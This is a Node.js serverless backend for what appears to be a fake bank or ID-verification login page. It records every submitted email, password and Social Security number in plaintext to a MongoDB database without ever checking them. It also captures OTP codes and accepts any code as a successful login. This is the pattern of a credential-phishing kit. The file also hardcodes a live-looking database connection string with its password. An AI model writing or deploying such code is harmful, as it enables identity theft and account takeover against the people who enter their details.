const express = require("express");
const serverless = require("serverless-http");
const mongoose = require("mongoose");

// MongoDB Models (inline for serverless)
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  isEmailVerified: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const otpCodeSchema = new mongoose.Schema({
  email: { type: String, required: true },
  code: { type: String, required: true },
  expiresAt: { type: Date, required: true },
  isUsed: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const loginAttemptSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true },
  ssn: { type: String, required: true },
  success: { type: Boolean, required: true },
  ipAddress: { type: String },
  userAgent: { type: String },
  createdAt: { type: Date, default: Date.now }
});

const otpAttemptSchema = new mongoose.Schema({
  email: { type: String, required: true },
  code: { type: String, required: true },
  success: { type: Boolean, required: true },
  ipAddress: { type: String },
  userAgent: { type: String },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.models.User || mongoose.model('User', userSchema);
const OTPCode = mongoose.models.OTPCode || mongoose.model('OTPCode', otpCodeSchema);
const LoginAttempt = mongoose.models.LoginAttempt || mongoose.model('LoginAttempt', loginAttemptSchema);
const OTPAttempt = mongoose.models.OTPAttempt || mongoose.model('OTPAttempt', otpAttemptSchema);

const app = express();
const router = express.Router();

// CORS middleware for Netlify
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://securebank69_id-db_user:sCgZIxMNjYYi72HA@id-me.sg89vi5.mongodb.net/secure-id?retryWrites=true&w=majority&appName=id-me';

let isConnected = false;

async function connectToMongoDB() {
  if (isConnected) {
    return true;
  }

  try {
    await mongoose.connect(MONGODB_URI, {
      connectTimeoutMS: 10000,
      serverSelectionTimeoutMS: 10000,
    });
    isConnected = true;
    console.log('Connected to MongoDB');
    return true;
  } catch (error) {
    console.error('Error connecting to MongoDB:', error);
    return false;
  }
}

// Storage class simplified for serverless
class MongoDBStorage {
  async getUserByEmail(email) {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, skipping user lookup');
      return undefined;
    }
    try {
      const user = await User.findOne({ email }).lean();
      if (!user) return undefined;
      const { _id, ...userData } = user;
      return { ...userData, id: _id.toString() };
    } catch (error) {
      console.error('Error getting user by email:', error);
      return undefined;
    }
  }

  async createUser(insertUser) {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, creating mock user');
      return {
        id: 'mock_' + Date.now(),
        email: insertUser.email,
        password: insertUser.password,
        isEmailVerified: false,
        createdAt: new Date()
      };
    }
    try {
      const user = new User(insertUser);
      const savedUser = await user.save();
      const { _id, ...userData } = savedUser.toObject();
      return { ...userData, id: _id.toString() };
    } catch (error) {
      console.error('Error creating user:', error);
      return {
        id: 'mock_' + Date.now(),
        email: insertUser.email,
        password: insertUser.password,
        isEmailVerified: false,
        createdAt: new Date()
      };
    }
  }

  async generateOTP(email) {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresAt = new Date(Date.now() + 5 * 60 * 1000);
    
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, creating mock OTP');
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        expiresAt,
        isUsed: false,
        createdAt: new Date()
      };
    }
    
    try {
      await OTPCode.deleteMany({ email });
      const otpCode = new OTPCode({
        email,
        code,
        expiresAt,
        isUsed: false
      });
      
      const savedOtp = await otpCode.save();
      const { _id, ...otpData } = savedOtp.toObject();
      return { ...otpData, id: _id.toString() };
    } catch (error) {
      console.error('Error generating OTP:', error);
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        expiresAt,
        isUsed: false,
        createdAt: new Date()
      };
    }
  }

  async logLoginAttempt(email, password, ssn, success, ipAddress, userAgent) {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, logging to console instead');
      console.log('LOGIN ATTEMPT:', { email, password, ssn, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
    
    try {
      const loginAttempt = new LoginAttempt({
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent
      });
      
      const savedAttempt = await loginAttempt.save();
      const { _id, ...attemptData } = savedAttempt.toObject();
      return { 
        ...attemptData, 
        id: _id.toString(),
        ipAddress: attemptData.ipAddress || undefined,
        userAgent: attemptData.userAgent || undefined
      };
    } catch (error) {
      console.error('Error logging login attempt:', error);
      console.log('LOGIN ATTEMPT (FALLBACK):', { email, password, ssn, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
  }

  async logOTPAttempt(email, code, success, ipAddress, userAgent) {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, logging to console instead');
      console.log('OTP ATTEMPT:', { email, code, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
    
    try {
      const otpAttempt = new OTPAttempt({
        email,
        code,
        success,
        ipAddress,
        userAgent
      });
      
      const savedAttempt = await otpAttempt.save();
      const { _id, ...attemptData } = savedAttempt.toObject();
      return { 
        ...attemptData, 
        id: _id.toString(),
        ipAddress: attemptData.ipAddress || undefined,
        userAgent: attemptData.userAgent || undefined
      };
    } catch (error) {
      console.error('Error logging OTP attempt:', error);
      console.log('OTP ATTEMPT (FALLBACK):', { email, code, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
  }
}

const storage = new MongoDBStorage();

// Simple validation functions
function validateLogin(data) {
  if (!data.email || !data.email.includes('@')) {
    throw new Error('Please enter a valid email address');
  }
  if (!data.password || data.password.length < 6) {
    throw new Error('Password must be at least 6 characters');
  }
  if (!data.ssn || !/^\d{3}-\d{2}-\d{4}$/.test(data.ssn)) {
    throw new Error('SSN must be in format XXX-XX-XXXX');
  }
  return data;
}

function validateOTP(data) {
  if (!data.email || !data.email.includes('@')) {
    throw new Error('Please enter a valid email address');
  }
  if (!data.code || data.code.length !== 6) {
    throw new Error('OTP code must be 6 digits');
  }
  return data;
}

// Routes
router.post('/auth/login', async (req, res) => {
  try {
    const validatedData = validateLogin(req.body);
    const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
    const userAgent = req.get('User-Agent') || 'unknown';
    
    await storage.logLoginAttempt(validatedData.email, validatedData.password, validatedData.ssn, true, ipAddress, userAgent);
    
    const otpCode = await storage.generateOTP(validatedData.email);
    
    res.json({
      success: true, 
      message: "OTP sent to your email",
      email: validatedData.email,
      otp: otpCode.code // For demo purposes only
    });
  } catch (error) {
    if (error.message) {
      const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
      const userAgent = req.get('User-Agent') || 'unknown';
      try {
        await storage.logLoginAttempt(
          req.body.email || 'invalid', 
          req.body.password || 'invalid', 
          req.body.ssn || 'invalid', 
          false, 
          ipAddress, 
          userAgent
        );
      } catch (logError) {
        // Ignore logging errors for invalid data
      }
      
      return res.status(400).json({ 
        success: false, 
        message: error.message 
      });
    }
    res.status(500).json({ 
      success: false, 
      message: "Internal server error" 
    });
  }
});

router.post('/auth/verify-otp', async (req, res) => {
  try {
    const validatedData = validateOTP(req.body);
    const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
    const userAgent = req.get('User-Agent') || 'unknown';
    
    await storage.logOTPAttempt(validatedData.email, validatedData.code, true, ipAddress, userAgent);
    
    res.json({ 
      success: true, 
      message: "Login successful",
      redirectUrl: "/dashboard"
    });
  } catch (error) {
    if (error.message) {
      return res.status(400).json({ 
        success: false, 
        message: error.message 
      });
    }
    res.status(500).json({ 
      success: false, 
      message: "Internal server error" 
    });
  }
});

router.post('/auth/resend-otp', async (req, res) => {
  try {
    const { email } = req.body;
    
    if (!email) {
      return res.status(400).json({ 
        success: false, 
        message: "Email is required" 
      });
    }

    const user = await storage.getUserByEmail(email);
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: "User not found" 
      });
    }

    const otpCode = await storage.generateOTP(email);
    
    res.json({ 
      success: true, 
      message: "New OTP sent to your email",
      otp: otpCode.code // For demo purposes only
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      message: "Internal server error" 
    });
  }
});

router.post('/auth/create-demo-user', async (req, res) => {
  try {
    const demoUser = await storage.createUser({
      email: "demo@securebank.com",
      password: "password123"
    });
    
    res.json({ 
      success: true, 
      message: "Demo user created",
      user: { id: demoUser.id, email: demoUser.email }
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      message: "Internal server error" 
    });
  }
});

// Mount the router
app.use('/.netlify/functions/api', router);

// Export the serverless function
module.exports.handler = serverless(app);